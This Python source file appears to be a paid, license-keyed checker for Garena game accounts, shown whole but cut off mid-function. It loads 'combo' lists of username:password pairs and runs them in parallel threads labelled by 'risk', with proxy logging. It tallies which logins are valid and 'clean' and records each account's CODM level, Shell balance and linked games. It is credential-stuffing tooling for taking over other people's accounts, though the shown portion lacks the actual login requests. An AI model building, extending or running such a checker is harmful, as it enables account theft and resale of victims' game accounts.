    print(f"  {_A_MAGENTA}│{_A_RST}  {_A_YELLOW}[ {_A_BOLD}USER AUTHENTICATION{_A_RST}{_A_YELLOW} ]{_A_RST}"
          f"{' ' * 42}{_A_MAGENTA}│{_A_RST}")
    print(f"  {_A_MAGENTA}└{'─' * 68}┘{_A_RST}")
    print()

    try:
        username = input(f"  {_A_YELLOW}❯ Username :{_A_RST} ").strip()
        if not username:
            username = "anonymous"
        _USER_KEY_SESSION["username"] = username
    except (KeyboardInterrupt, EOFError):
        print()
        return False

    print()

    try:
        key_input = input(f"  {_A_YELLOW}❯ License Key :{_A_RST} ").strip().upper()
    except (KeyboardInterrupt, EOFError):
        print()
        return False

    if not key_input:
        print(f"\n  {_A_RED}✖  No key entered.{_A_RST}")
        time.sleep(1.5)
        return False

    print()
    print(f"  {_A_DIM}Verifying…{_A_RST}")
    time.sleep(0.5)

    ok, msg, rec = _validate_key_str(key_input)
    if not ok:
        print(f"\n  {_A_RED}✖  {msg}{_A_RST}")
        print(f"  {_A_DIM}Press Enter to exit…{_A_RST}")
        input()
        return False

    _consume_key_str(key_input)
    _, _, rec = _validate_key_str(key_input, allow_rebind=True)
    _session_save(key_input, rec)
    _USER_KEY_SESSION.update({
        "key": key_input,
        "expires_at": rec.get("expires_at"),
        "uses": rec.get("uses", 0),
        "username": username,
    })

    print()
    print(f"  {_A_YELLOW}[ {_A_BOLD}ACCESS GRANTED{_A_RST}{_A_YELLOW} ]{_A_RST}  "
          f"Welcome {_A_CYAN}{username}{_A_RST}")
    print(f"  {_A_DIM}Key: {key_input}   Expires: {_fmt_remain_key(rec.get('expires_at'))}{_A_RST}")
    time.sleep(1.6)
    return True


# ══════════════════════════════════════════════════════════════════════════
#  END KEY SYSTEM
# ══════════════════════════════════════════════════════════════════════════

console = Console()
_shutil_ui = shutil

_CY = _F.CYAN + _S.BRIGHT
_GN = _F.GREEN + _S.BRIGHT
_RD = _F.RED + _S.BRIGHT
_YL = _F.YELLOW + _S.BRIGHT
_MG = _F.MAGENTA + _S.BRIGHT
_WH = _F.WHITE + _S.BRIGHT
_BLU = _F.BLUE + _S.BRIGHT
_DIM = _S.DIM
_RST = _S.RESET_ALL
_BRT = _S.BRIGHT
_ITL = "\033[3m"
_SL = "\033[38;5;240m"
_GR = "\033[38;5;114m"
_GD = "\033[38;5;222m"
P = 'bold bright_cyan'
S = 'bold bright_magenta'
OK = 'bold bright_green'
ER = 'bold bright_red'
WN = 'bold yellow'
MU = 'dim'
TX = 'bright_white'
BL = 'cyan'

def _tw():
    return _shutil_ui.get_terminal_size((80, 24)).columns

def _w(n=72):
    return min(_tw() - 4, n)

def _ts():
    return datetime.now().strftime('%H:%M:%S')

_RE_ANSI = re.compile(r'\x1b\[[0-9;]*m')
_RE_LEVEL = re.compile(r'Account Level:\s*(\d+)')
_RE_SHELL = re.compile(r'Garena Shell:\s*(\d+)')

def _visible_len(text):
    return len(_RE_ANSI.sub('', str(text)))

def _strip_rich(text):
    return re.sub('\\[/?[^\\]]+\\]', '', str(text))

def _log(level: str, msg: str, indent: str='  '):
    col, icon = _LOG_ICONS.get(level, (_DIM, '·'))
    clean = _strip_rich(msg)
    print(f'{indent}{col}{icon}{_RST}  {clean}')

_LOG_ICONS = {'INFO': (_CY, 'ℹ'), 'SUCCESS': (_GN, '✔'), 'WARNING': (_YL, '⚠'), 'ERROR': (_RD, '✖'), 'DEBUG': (_DIM, '·'), 'REQUEST': (_CY, '→'), 'RESPONSE': (_CY, '←'), 'RETRY': (_YL, '↺'), 'PROXY': (_MG, '⬡'), 'THREAD': (_MG, '⧫'), 'SAVE': (_GN, '⬇')}

THREAD_CONFIGS = {'1': {'threads': 1, 'label': '1  thread   — Safe, slower', 'icon': ''}, '2': {'threads': 3, 'label': '3  threads  — Balanced', 'icon': ''}, '3': {'threads': 5, 'label': '5  threads  — Fast', 'icon': ''}, '4': {'threads': 10, 'label': '10 threads  — Very fast (risk)', 'icon': ''}, '5': {'threads': 15, 'label': '15 threads  — Max speed (high risk)', 'icon': ''}}
from rich.box import DOUBLE, Box

CARD = Box('┏━━┓\n┃  ┃\n┣━━┫\n┃  ┃\n┣━━┫\n┣━━┫\n┃  ┃\n┗━━┛\n')
telegram_enabled = False
_telegram_config = None
CODM_REGIONS = {'AF':{'name':'Afghanistan','code':'93','flag':'🇦🇫'},'AL':{'name':'Albania','code':'355','flag':'🇦🇱'},'DZ':{'name':'Algeria','code':'213','flag':'🇩🇿'},'AD':{'name':'Andorra','code':'376','flag':'🇦🇩'},'AO':{'name':'Angola','code':'244','flag':'🇦🇴'},'AG':{'name':'Antigua and Barbuda','code':'1','flag':'🇦🇬'},'AR':{'name':'Argentina','code':'54','flag':'🇦🇷'},'AM':{'name':'Armenia','code':'374','flag':'🇦🇲'},'AU':{'name':'Australia','code':'61','flag':'🇦🇺'},'AT':{'name':'Austria','code':'43','flag':'🇦🇹'},'AZ':{'name':'Azerbaijan','code':'994','flag':'🇦🇿'},'BS':{'name':'Bahamas','code':'1','flag':'🇧🇸'},'BH':{'name':'Bahrain','code':'973','flag':'🇧🇭'},'BD':{'name':'Bangladesh','code':'880','flag':'🇧🇩'},'BB':{'name':'Barbados','code':'1','flag':'🇧🇧'},'BY':{'name':'Belarus','code':'375','flag':'🇧🇾'},'BE':{'name':'Belgium','code':'32','flag':'🇧🇪'},'BZ':{'name':'Belize','code':'501','flag':'🇧🇿'},'BJ':{'name':'Benin','code':'229','flag':'🇧🇯'},'BT':{'name':'Bhutan','code':'975','flag':'🇧🇹'},'BO':{'name':'Bolivia','code':'591','flag':'🇧🇴'},'BA':{'name':'Bosnia and Herzegovina','code':'387','flag':'🇧🇦'},'BW':{'name':'Botswana','code':'267','flag':'🇧🇼'},'BR':{'name':'Brazil','code':'55','flag':'🇧🇷'},'BN':{'name':'Brunei','code':'673','flag':'🇧🇳'},'BG':{'name':'Bulgaria','code':'359','flag':'🇧🇬'},'BF':{'name':'Burkina Faso','code':'226','flag':'🇧🇫'},'BI':{'name':'Burundi','code':'257','flag':'🇧🇮'},'KH':{'name':'Cambodia','code':'855','flag':'🇰🇭'},'CM':{'name':'Cameroon','code':'237','flag':'🇨🇲'},'CA':{'name':'Canada','code':'1','flag':'🇨🇦'},'CV':{'name':'Cape Verde','code':'238','flag':'🇨🇻'},'CF':{'name':'Central African Republic','code':'236','flag':'🇨🇫'},'TD':{'name':'Chad','code':'235','flag':'🇹🇩'},'CL':{'name':'Chile','code':'56','flag':'🇨🇱'},'CN':{'name':'China','code':'86','flag':'🇨🇳'},'CO':{'name':'Colombia','code':'57','flag':'🇨🇴'},'KM':{'name':'Comoros','code':'269','flag':'🇰🇲'},'CG':{'name':'Congo','code':'242','flag':'🇨🇬'},'CD':{'name':'Congo (DRC)','code':'243','flag':'🇨🇩'},'CR':{'name':'Costa Rica','code':'506','flag':'🇨🇷'},'CI':{'name':"Côte d'Ivoire",'code':'225','flag':'🇨🇮'},'HR':{'name':'Croatia','code':'385','flag':'🇭🇷'},'CU':{'name':'Cuba','code':'53','flag':'🇨🇺'},'CY':{'name':'Cyprus','code':'357','flag':'🇨🇾'},'CZ':{'name':'Czech Republic','code':'420','flag':'🇨🇿'},'DK':{'name':'Denmark','code':'45','flag':'🇩🇰'},'DJ':{'name':'Djibouti','code':'253','flag':'🇩🇯'},'DM':{'name':'Dominica','code':'1','flag':'🇩🇲'},'DO':{'name':'Dominican Republic','code':'1','flag':'🇩🇴'},'EC':{'name':'Ecuador','code':'593','flag':'🇪🇨'},'EG':{'name':'Egypt','code':'20','flag':'🇪🇬'},'SV':{'name':'El Salvador','code':'503','flag':'🇸🇻'},'GQ':{'name':'Equatorial Guinea','code':'240','flag':'🇬🇶'},'ER':{'name':'Eritrea','code':'291','flag':'🇪🇷'},'EE':{'name':'Estonia','code':'372','flag':'🇪🇪'},'SZ':{'name':'Eswatini','code':'268','flag':'🇸🇿'},'ET':{'name':'Ethiopia','code':'251','flag':'🇪🇹'},'FJ':{'name':'Fiji','code':'679','flag':'🇫🇯'},'FI':{'name':'Finland','code':'358','flag':'🇫🇮'},'FR':{'name':'France','code':'33','flag':'🇫🇷'},'GA':{'name':'Gabon','code':'241','flag':'🇬🇦'},'GM':{'name':'Gambia','code':'220','flag':'🇬🇲'},'GE':{'name':'Georgia','code':'995','flag':'🇬🇪'},'DE':{'name':'Germany','code':'49','flag':'🇩🇪'},'GH':{'name':'Ghana','code':'233','flag':'🇬🇭'},'GR':{'name':'Greece','code':'30','flag':'🇬🇷'},'GD':{'name':'Grenada','code':'1','flag':'🇬🇩'},'GT':{'name':'Guatemala','code':'502','flag':'🇬🇹'},'GN':{'name':'Guinea','code':'224','flag':'🇬🇳'},'GW':{'name':'Guinea-Bissau','code':'245','flag':'🇬🇼'},'GY':{'name':'Guyana','code':'592','flag':'🇬🇾'},'HT':{'name':'Haiti','code':'509','flag':'🇭🇹'},'HN':{'name':'Honduras','code':'504','flag':'🇭🇳'},'HK':{'name':'Hong Kong','code':'852','flag':'🇭🇰'},'HU':{'name':'Hungary','code':'36','flag':'🇭🇺'},'IS':{'name':'Iceland','code':'354','flag':'🇮🇸'},'IN':{'name':'India','code':'91','flag':'🇮🇳'},'ID':{'name':'Indonesia','code':'62','flag':'🇮🇩'},'IR':{'name':'Iran','code':'98','flag':'🇮🇷'},'IQ':{'name':'Iraq','code':'964','flag':'🇮🇶'},'IE':{'name':'Ireland','code':'353','flag':'🇮🇪'},'IL':{'name':'Israel','code':'972','flag':'🇮🇱'},'IT':{'name':'Italy','code':'39','flag':'🇮🇹'},'JM':{'name':'Jamaica','code':'1','flag':'🇯🇲'},'JP':{'name':'Japan','code':'81','flag':'🇯🇵'},'JO':{'name':'Jordan','code':'962','flag':'🇯🇴'},'KZ':{'name':'Kazakhstan','code':'7','flag':'🇰🇿'},'KE':{'name':'Kenya','code':'254','flag':'🇰🇪'},'KI':{'name':'Kiribati','code':'686','flag':'🇰🇮'},'KR':{'name':'South Korea','code':'82','flag':'🇰🇷'},'KW':{'name':'Kuwait','code':'965','flag':'🇰🇼'},'KG':{'name':'Kyrgyzstan','code':'996','flag':'🇰🇬'},'LA':{'name':'Laos','code':'856','flag':'🇱🇦'},'LV':{'name':'Latvia','code':'371','flag':'🇱🇻'},'LB':{'name':'Lebanon','code':'961','flag':'🇱🇧'},'LS':{'name':'Lesotho','code':'266','flag':'🇱🇸'},'LR':{'name':'Liberia','code':'231','flag':'🇱🇷'},'LY':{'name':'Libya','code':'218','flag':'🇱🇾'},'LI':{'name':'Liechtenstein','code':'423','flag':'🇱🇮'},'LT':{'name':'Lithuania','code':'370','flag':'🇱🇹'},'LU':{'name':'Luxembourg','code':'352','flag':'🇱🇺'},'MO':{'name':'Macau','code':'853','flag':'🇲🇴'},'MG':{'name':'Madagascar','code':'261','flag':'🇲🇬'},'MW':{'name':'Malawi','code':'265','flag':'🇲🇼'},'MY':{'name':'Malaysia','code':'60','flag':'🇲🇾'},'MV':{'name':'Maldives','code':'960','flag':'🇲🇻'},'ML':{'name':'Mali','code':'223','flag':'🇲🇱'},'MT':{'name':'Malta','code':'356','flag':'🇲🇹'},'MH':{'name':'Marshall Islands','code':'692','flag':'🇲🇭'},'MR':{'name':'Mauritania','code':'222','flag':'🇲🇷'},'MU':{'name':'Mauritius','code':'230','flag':'🇲🇺'},'MX':{'name':'Mexico','code':'52','flag':'🇲🇽'},'FM':{'name':'Micronesia','code':'691','flag':'🇫🇲'},'MD':{'name':'Moldova','code':'373','flag':'🇲🇩'},'MC':{'name':'Monaco','code':'377','flag':'🇲🇨'},'MN':{'name':'Mongolia','code':'976','flag':'🇲🇳'},'ME':{'name':'Montenegro','code':'382','flag':'🇲🇪'},'MA':{'name':'Morocco','code':'212','flag':'🇲🇦'},'MZ':{'name':'Mozambique','code':'258','flag':'🇲🇿'},'MM':{'name':'Myanmar','code':'95','flag':'🇲🇲'},'NA':{'name':'Namibia','code':'264','flag':'🇳🇦'},'NR':{'name':'Nauru','code':'674','flag':'🇳🇷'},'NP':{'name':'Nepal','code':'977','flag':'🇳🇵'},'NL':{'name':'Netherlands','code':'31','flag':'🇳🇱'},'NZ':{'name':'New Zealand','code':'64','flag':'🇳🇿'},'NI':{'name':'Nicaragua','code':'505','flag':'🇳🇮'},'NE':{'name':'Niger','code':'227','flag':'🇳🇪'},'NG':{'name':'Nigeria','code':'234','flag':'🇳🇬'},'MK':{'name':'North Macedonia','code':'389','flag':'🇲🇰'},'NO':{'name':'Norway','code':'47','flag':'🇳🇴'},'OM':{'name':'Oman','code':'968','flag':'🇴🇲'},'PK':{'name':'Pakistan','code':'92','flag':'🇵🇰'},'PW':{'name':'Palau','code':'680','flag':'🇵🇼'},'PA':{'name':'Panama','code':'507','flag':'🇵🇦'},'PG':{'name':'Papua New Guinea','code':'675','flag':'🇵🇬'},'PY':{'name':'Paraguay','code':'595','flag':'🇵🇾'},'PE':{'name':'Peru','code':'51','flag':'🇵🇪'},'PH':{'name':'Philippines','code':'63','flag':'🇵🇭'},'PL':{'name':'Poland','code':'48','flag':'🇵🇱'},'PT':{'name':'Portugal','code':'351','flag':'🇵🇹'},'QA':{'name':'Qatar','code':'974','flag':'🇶🇦'},'RO':{'name':'Romania','code':'40','flag':'🇷🇴'},'RU':{'name':'Russia','code':'7','flag':'🇷🇺'},'RW':{'name':'Rwanda','code':'250','flag':'🇷🇼'},'KN':{'name':'Saint Kitts and Nevis','code':'1','flag':'🇰🇳'},'LC':{'name':'Saint Lucia','code':'1','flag':'🇱🇨'},'VC':{'name':'Saint Vincent and the Grenadines','code':'1','flag':'🇻🇨'},'WS':{'name':'Samoa','code':'685','flag':'🇼🇸'},'SM':{'name':'San Marino','code':'378','flag':'🇸🇲'},'ST':{'name':'São Tomé and Príncipe','code':'239','flag':'🇸🇹'},'SA':{'name':'Saudi Arabia','code':'966','flag':'🇸🇦'},'SN':{'name':'Senegal','code':'221','flag':'🇸🇳'},'RS':{'name':'Serbia','code':'381','flag':'🇷🇸'},'SC':{'name':'Seychelles','code':'248','flag':'🇸🇨'},'SL':{'name':'Sierra Leone','code':'232','flag':'🇸🇱'},'SG':{'name':'Singapore','code':'65','flag':'🇸🇬'},'SK':{'name':'Slovakia','code':'421','flag':'🇸🇰'},'SI':{'name':'Slovenia','code':'386','flag':'🇸🇮'},'SB':{'name':'Solomon Islands','code':'677','flag':'🇸🇧'},'SO':{'name':'Somalia','code':'252','flag':'🇸🇴'},'ZA':{'name':'South Africa','code':'27','flag':'🇿🇦'},'SS':{'name':'South Sudan','code':'211','flag':'🇸🇸'},'ES':{'name':'Spain','code':'34','flag':'🇪🇸'},'LK':{'name':'Sri Lanka','code':'94','flag':'🇱🇰'},'SD':{'name':'Sudan','code':'249','flag':'🇸🇩'},'SR':{'name':'Suriname','code':'597','flag':'🇸🇷'},'SE':{'name':'Sweden','code':'46','flag':'🇸🇪'},'CH':{'name':'Switzerland','code':'41','flag':'🇨🇭'},'SY':{'name':'Syria','code':'963','flag':'🇸🇾'},'TW':{'name':'Taiwan','code':'886','flag':'🇹🇼'},'TJ':{'name':'Tajikistan','code':'992','flag':'🇹🇯'},'TZ':{'name':'Tanzania','code':'255','flag':'🇹🇿'},'TH':{'name':'Thailand','code':'66','flag':'🇹🇭'},'TL':{'name':'Timor-Leste','code':'670','flag':'🇹🇱'},'TG':{'name':'Togo','code':'228','flag':'🇹🇬'},'TO':{'name':'Tonga','code':'676','flag':'🇹🇴'},'TT':{'name':'Trinidad and Tobago','code':'1','flag':'🇹🇹'},'TN':{'name':'Tunisia','code':'216','flag':'🇹🇳'},'TR':{'name':'Turkey','code':'90','flag':'🇹🇷'},'TM':{'name':'Turkmenistan','code':'993','flag':'🇹🇲'},'TV':{'name':'Tuvalu','code':'688','flag':'🇹🇻'},'UG':{'name':'Uganda','code':'256','flag':'🇺🇬'},'UA':{'name':'Ukraine','code':'380','flag':'🇺🇦'},'AE':{'name':'United Arab Emirates','code':'971','flag':'🇦🇪'},'GB':{'name':'United Kingdom','code':'44','flag':'🇬🇧'},'US':{'name':'United States','code':'1','flag':'🇺🇸'},'UY':{'name':'Uruguay','code':'598','flag':'🇺🇾'},'UZ':{'name':'Uzbekistan','code':'998','flag':'🇺🇿'},'VU':{'name':'Vanuatu','code':'678','flag':'🇻🇺'},'VA':{'name':'Vatican City','code':'39','flag':'🇻🇦'},'VE':{'name':'Venezuela','code':'58','flag':'🇻🇪'},'VN':{'name':'Vietnam','code':'84','flag':'🇻🇳'},'YE':{'name':'Yemen','code':'967','flag':'🇾🇪'},'ZM':{'name':'Zambia','code':'260','flag':'🇿🇲'},'ZW':{'name':'Zimbabwe','code':'263','flag':'🇿🇼'}}

def sanitize_string(text):
    if not text or text == 'N/A':
        return text
    try:
        return text.encode('ascii', errors='ignore').decode('ascii')
    except:
        return re.sub('[^\\x00-\\x7F]+', '', str(text))

def clean_account_line(line):
    if not line:
        return (None, None)
    line = line.strip().lstrip('\ufeff\ufffe')
    line = ''.join((char for char in line if char.isprintable() or char == ':'))
    if ':' not in line:
        return (None, None)
    try:
        parts = line.split(':', 1)
        if len(parts) != 2:
            return (None, None)
        account = parts[0].strip()
        password = parts[1].strip()
        account = sanitize_string(account)
        password = sanitize_string(password)
        if not account or not password:
            return (None, None)
        return (account, password)
    except:
        return (None, None)

def format_codm_region(region_code):
    if not region_code or region_code == 'N/A':
        return 'N/A'
    region_code = region_code.upper()
    region_info = CODM_REGIONS.get(region_code)
    if region_info:
        return f"{region_info['flag']} {region_info['name']} ({region_code})"
    else:
        return f'{region_code}'

def format_mobile_number(mobile_no, country_code=None):
    if not mobile_no or mobile_no == 'N/A' or (not str(mobile_no).strip()):
        return 'N/A'
    mobile_str = str(mobile_no).strip()
    mobile_str = mobile_str.replace('+', '').replace(' ', '').replace('-', '')
    if country_code:
        country_code = str(country_code).strip()
        if not mobile_str.startswith(country_code):
            if mobile_str.startswith('0'):
                mobile_str = country_code + mobile_str[1:]
            else:
                mobile_str = country_code + mobile_str
    detected_country_code = None
    for code_key, region_info in CODM_REGIONS.items():
        code = region_info['code']
        if mobile_str.startswith(code):
            detected_country_code = code
            break
    if detected_country_code:
        local_number = mobile_str[len(detected_country_code):]
        if len(local_number) >= 4:
            masked = '*' * (len(local_number) - 4) + local_number[-4:]
            return f'+{detected_country_code} {masked}'
        else:
            return f'+{detected_country_code} {local_number}'
    elif len(mobile_str) >= 4:
        masked = '*' * (len(mobile_str) - 4) + mobile_str[-4:]
        return f'+{masked}'
    else:
        return mobile_str

_SHUTDOWN = threading.Event()

def _sigint_handler(sig, frame):
    if _SHUTDOWN.is_set():
        print(f'\n  {_YL}⚠  Force exit.{_RST}')
        os._exit(130)
    _SHUTDOWN.set()
    print(f'\n  {_YL}⚠  Graceful shutdown initiated (press Ctrl+C again to force)…{_RST}')

signal.signal(signal.SIGINT, _sigint_handler)

class ColoredFormatter(logging.Formatter):
    COLORS = {'DEBUG': colorama.Fore.CYAN, 'INFO': colorama.Fore.CYAN, 'WARNING': colorama.Fore.YELLOW, 'ERROR': colorama.Fore.RED, 'CRITICAL': colorama.Fore.RED + colorama.Back.BLACK + colorama.Style.BRIGHT}
    ICONS = {'DEBUG': '⊡', 'INFO': 'ℹ', 'WARNING': '⚠', 'ERROR': '✖', 'CRITICAL': '☠'}
    RESET = colorama.Style.RESET_ALL

    def format(self, record):
        levelname = record.levelname
        color = self.COLORS.get(levelname, '')
        icon = self.ICONS.get(levelname, '·')
        tag = f'{levelname:<8}'
        if color:
            record.msg = f'{color}{icon} {tag}{self.RESET} {record.msg}'
        return super().format(record)

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.INFO)
logging.getLogger('urllib3').setLevel(logging.ERROR)
logging.getLogger('requests').setLevel(logging.ERROR)

DEFAULT_THREADS = 5
CHECK_OTHER_GAMES: bool = False
GAME_FILE_MAP = {'CODM': 'CODM.txt', 'FREEFIRE': 'FreeFire.txt', 'FREE FIRE': 'FreeFire.txt', 'ROV': 'ROV.txt', 'DELTA FORCE': 'DeltaForce.txt', 'AOV': 'AOV.txt', 'SPEED DRIFTERS': 'SpeedDrifters.txt', 'BLACK CLOVER M': 'BlackCloverM.txt', 'GARENA UNDAWN': 'Undawn.txt', 'FC ONLINE': 'FCOnline.txt', 'FC ONLINE M': 'FCOnlineM.txt', 'MOONLIGHT BLADE': 'MoonlightBlade.txt', 'FAST THRILL': 'FastThrill.txt', 'THE WORLD OF WAR': 'WorldOfWar.txt'}
GAME_DISPLAY_NAMES = [('CODM', 'CODM'), ('FREEFIRE', 'Free Fire'), ('ROV', 'ROV'), ('DELTA FORCE', 'Delta Force'), ('AOV', 'AOV'), ('SPEED DRIFTERS', 'Speed Drifters'), ('BLACK CLOVER M', 'Black Clover M'), ('GARENA UNDAWN', 'Undawn'), ('FC ONLINE', 'FC Online'), ('FC ONLINE M', 'FC Online M'), ('MOONLIGHT BLADE', 'Moonlight Blade'), ('FAST THRILL', 'Fast Thrill'), ('THE WORLD OF WAR', 'World of War')]
OAUTH_MAX_RETRIES = 3
OAUTH_RETRY_DELAY = 2

class AccountFileManager:

    def __init__(self, combo_folder='Combo'):
        self.combo_folder = Path(combo_folder)
        self.combo_folder.mkdir(exist_ok=True)
        self._file_lock = threading.Lock()

    def scan_combo_folder(self):
        return list(self.combo_folder.glob('*.txt'))

    def get_file_info(self, file_path):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip() and ':' in line]
                account_count = len(lines)
            file_size = file_path.stat().st_size
            return {'name': file_path.name, 'path': str(file_path), 'size': file_size, 'size_str': self._format_size(file_size), 'account_count': account_count}
        except Exception as e:
            logger.error(f'Error reading file {file_path}')
            return None

    def _format_size(self, size_bytes):
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size_bytes < 1024.0:
                return f'{size_bytes:.2f} {unit}'
            size_bytes /= 1024.0
        return f'{size_bytes:.2f} TB'

    def clean_file_encoding(self, file_path):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            cleaned_lines = []
            invalid_count = 0
            for line in lines:
                account, password = clean_account_line(line)
                if account and password:
                    cleaned_lines.append(f'{account}:{password}\n')
                else:
                    invalid_count += 1
            with open(file_path, 'w', encoding='utf-8') as f:
                f.writelines(cleaned_lines)
            return (len(cleaned_lines), invalid_count)
        except Exception as e:
            logger.error(f'Error cleaning file encoding')
            return (0, 0)

    def clean_duplicates(self, file_path, overwrite=True):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip()]
            original_count = len(lines)
            unique_lines = list(dict.fromkeys(lines))
            duplicates_removed = original_count - len(unique_lines)
            if overwrite:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique_lines))
            else:
                new_path = file_path.parent / f'{file_path.stem}_cleaned.txt'
                with open(new_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique_lines))
            return duplicates_removed
        except Exception as e:
            logger.error(f'Error cleaning duplicates')
            return 0

    def remove_line_from_file(self, file_path, line_to_remove):
        try:
            file_path = Path(file_path)
            target = line_to_remove.strip()
            with self._file_lock:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()
                with open(file_path, 'w', encoding='utf-8') as f:
                    for line in lines:
                        if line.strip() != target:
                            f.write(line)
            return True
        except Exception as e:
            logger.error(f'Error removing line')
            return False

class AccountFileViewer:
    def __init__(self):
        self.console = Console()

    def display_file_table(self, file_infos):
        table = Table(title="📊  COMBO FILES", title_style="bold cyan", box=box.ROUNDED, border_style="cyan", header_style="bold dim", expand=False, padding=(0, 1))
        table.add_column("#", justify="right", style="cyan", no_wrap=True)
        table.add_column("Filename", style="white", overflow="fold")
        table.add_column("Size", justify="left", style="yellow")
        table.add_column("Accounts", justify="right", style="green")
        table.add_column("Bar", no_wrap=True)
        max_ac = max((i["account_count"] for i in file_infos)) if file_infos else 1
        for idx, info in enumerate(file_infos, 1):
            filled = int(info["account_count"] / max_ac * 16) if max_ac else 0
            bar = Text()
            bar.append("█" * filled, style="cyan")
            bar.append("░" * (16 - filled), style="dim")
            table.add_row(str(idx), info["name"], info["size_str"], f"{info['account_count']:,}", bar)
        self.console.print()
        self.console.print(table)
        self.console.print()

    def prompt_file_selection(self, file_infos):
        self.console.print("  [dim]Enter file number or [cyan]'auto'[/cyan][dim] to pick largest[/dim]\n")
        while True:
            choice = input(f"  {_CY}❯{_RST} ").strip().lower()
            if choice == "auto":
                largest = max(file_infos, key=lambda x: x["account_count"])
                self.console.print(f"  [green]✔[/green] Auto-selected: [white]{largest['name']}[/white]")
                return largest["path"]
            try:
                idx = int(choice)
                if 1 <= idx <= len(file_infos):
                    return file_infos[idx - 1]["path"]
                self.console.print("  [red]✘[/red] Invalid number — try again.")
            except ValueError:
                self.console.print("  [red]✘[/red] Enter a number or 'auto'.")

    def prompt_clean_file(self):
        return Confirm.ask("  [yellow]?[/yellow]  [white]Clean file encoding?[/white]", default=True)

    def prompt_remove_duplicates(self):
        return Confirm.ask("  [yellow]?[/yellow]  [white]Remove duplicate lines?[/white]", default=False)

    def prompt_auto_remove_checked(self):
        return Confirm.ask("  [yellow]?[/yellow]  [white]Auto-remove checked lines?[/white]", default=False)

class LiveStats:
    """
    ═══════════════════════════════════════════════════════════════
    ✦  Enhanced Live Statistics — Elegant Polished Terminal Design
    ═══════════════════════════════════════════════════════════════
    """

    # ── Premium Design Tokens ────────────────────────────────────
    _C_PRIMARY   = 'bright_cyan'
    _C_SUCCESS   = 'bright_green'
    _C_WARNING   = 'bright_yellow'
    _C_ERROR     = 'bright_red'
    _C_INFO      = 'bright_magenta'
    _C_GOLD      = 'gold1'
    _C_VIOLET    = 'violet'
    _C_MUTED     = 'grey50'
    _C_FAINT     = 'grey30'
    _C_TEXT      = 'bright_white'

    # Sub-block characters for ultra-smooth progress bars (8 levels per cell)
    _SUB_BLOCKS  = ['', '▏', '▎', '▍', '▌', '▋', '▊', '▉']

    def __init__(self):
        self.valid_count = self.invalid_count = self.clean_count = self.not_clean_count = 0
        self.has_codm_count = self.no_codm_count = self.error_count = 0
        self.highest_clean_level = self.highest_not_clean_level = self.highest_shell = 0
        self.clean_level_counts = {'350+': 0, '201-349': 0, '101-200': 0, '1-100': 0}
        self.not_clean_level_counts = {'350+': 0, '201-349': 0, '101-200': 0, '1-100': 0}
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.total_accounts = 0
        self.game_counts = {k: 0 for k, _ in GAME_DISPLAY_NAMES}
        self.last_result_queue = deque(maxlen=200)

    # ── Stats update / retrieval ─────────────────────
    def update_stats(self, valid=False, clean=False, has_codm=False, is_error=False,
                     codm_level=0, game_connections=None, shell=0):
        with self.lock:
            if is_error:
                self.error_count += 1
            elif valid:
                self.valid_count += 1
                if clean:
                    self.clean_count += 1
                    if codm_level > self.highest_clean_level:
                        self.highest_clean_level = codm_level
                    if has_codm and codm_level > 0:
                        if codm_level <= 100:
                            self.clean_level_counts['1-100'] += 1
                        elif codm_level <= 200:
                            self.clean_level_counts['101-200'] += 1
                        elif codm_level <= 349:
                            self.clean_level_counts['201-349'] += 1
                        else:
                            self.clean_level_counts['350+'] += 1
                else:
                    self.not_clean_count += 1
                    if has_codm and codm_level > 0:
                        if codm_level > self.highest_not_clean_level:
                            self.highest_not_clean_level = codm_level
                        if codm_level <= 100:
                            self.not_clean_level_counts['1-100'] += 1
                        elif codm_level <= 200:
                            self.not_clean_level_counts['101-200'] += 1
                        elif codm_level <= 349:
                            self.not_clean_level_counts['201-349'] += 1
                        else:
                            self.not_clean_level_counts['350+'] += 1
                if has_codm:
                    self.has_codm_count += 1
                else:
                    self.no_codm_count += 1
                try:
                    if int(shell or 0) > self.highest_shell:
                        self.highest_shell = int(shell or 0)
                except:
                    pass
                for g in game_connections or []:
                    gname = g.get('game', '').upper()
                    if gname == 'FREE FIRE':
                        gname = 'FREEFIRE'
                    if gname in self.game_counts:
                        self.game_counts[gname] += 1
            else:
                self.invalid_count += 1

    def get_stats(self):
        with self.lock:
            return {
                'valid': self.valid_count, 'invalid': self.invalid_count,
                'clean': self.clean_count, 'not_clean': self.not_clean_count,
                'has_codm': self.has_codm_count, 'no_codm': self.no_codm_count,
                'error': self.error_count,
                'highest_clean_level': self.highest_clean_level,
                'highest_not_clean_level': self.highest_not_clean_level,
                'clean_level_counts': dict(self.clean_level_counts),
                'not_clean_level_counts': dict(self.not_clean_level_counts),
                'game_counts': dict(self.game_counts),
                'highest_shell': self.highest_shell
            }

    def get_processed_count(self):
        with self.lock:
            return self.valid_count + self.invalid_count + self.error_count

    def push_result(self, success, is_clean=False, has_codm=False, codm_level=0,
                    error_reason='', shell_balance=0):
        with self.lock:
            self.last_result_queue.append({
                'success': success, 'is_clean': is_clean, 'has_codm': has_codm,
                'codm_level': codm_level, 'error_reason': error_reason,
                'shell_balance': shell_balance
            })

    def pop_result(self):
        with self.lock:
            return self.last_result_queue.popleft() if self.last_result_queue else None

    # ═══════════════════════════════════════════════════════════════
    #  PREMIUM VISUAL HELPERS
    # ═══════════════════════════════════════════════════════════════

    def _elegant_bar(self, count, denom, color, width=20, show_pct=False, glow=False):
        if denom == 0:
            bar = Text("░" * width, style=self._C_FAINT)
            if show_pct:
                bar.append("  [ 0.0% ]", style=self._C_FAINT)
            return bar

        ratio = min(count / denom, 1.0)
        total_sub = width * 8
        filled = int(ratio * total_sub)
        full = filled // 8
        rem = filled % 8

        bar = Text()
        for i in range(full):
            if glow and i == full - 1 and rem == 0:
